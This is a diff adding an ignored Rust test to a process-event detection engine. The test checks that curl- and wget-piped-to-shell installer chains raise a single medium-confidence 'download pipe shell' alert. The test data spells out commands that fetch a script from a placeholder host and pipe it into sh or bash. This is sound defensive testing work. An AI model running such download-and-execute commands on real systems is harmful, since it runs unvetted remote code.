@@ -543,3 +543,48 @@ fn intermediate_non_root_child_does_not_erase_elevation_parent() {
         .iter()
         .any(|h| h == "phi_unbrokered_root_shell"));
 }
+
+#[test]
+#[ignore = "RAFIX-INTEGRATION: needs AML generic pipe heuristic fix"]
+fn installer_pipeline_unquoted_argv_has_no_high_or_wrapper_duplicate() {
+    // /proc cmdline joining does not restore shell quoting around the -c argument.
+    for (parent_cmd, downloader, download_cmd, shell) in [
+        (
+            "sh -c curl -fsSL https://download.invalid/install | sh",
+            "curl",
+            "curl -fsSL https://download.invalid/install",
+            "sh",
+        ),
+        (
+            "sh -c wget -qO- https://download.invalid/install | bash",
+            "wget",
+            "wget -qO- https://download.invalid/install",
+            "bash",
+        ),
+    ] {
+        let mut engine = DetectionEngine::default_with_rules();
+        let parent = engine.process_event(&event(ProcessExec, 900, 10, "sh", "bash", parent_cmd));
+        assert_eq!(
+            parent.confidence,
+            Confidence::None,
+            "parent argv is context: {parent_cmd}; {:?}",
+            parent.exploit_indicators
+        );
+        let download = engine.process_event(&event(
+            ProcessExec,
+            901,
+            900,
+            downloader,
+            "sh",
+            download_cmd,
+        ));
+        let shell = engine.process_event(&event(ProcessExec, 902, 900, shell, "sh", shell));
+        let alerts: Vec<_> = [parent, download, shell]
+            .into_iter()
+            .filter(|o| o.confidence != Confidence::None)
+            .collect();
+        assert_eq!(alerts.len(), 1);
+        assert_eq!(alerts[0].confidence, Confidence::Medium);
+        assert_eq!(alerts[0].temporal_hits, vec!["phi_download_pipe_shell"]);
+    }
+}
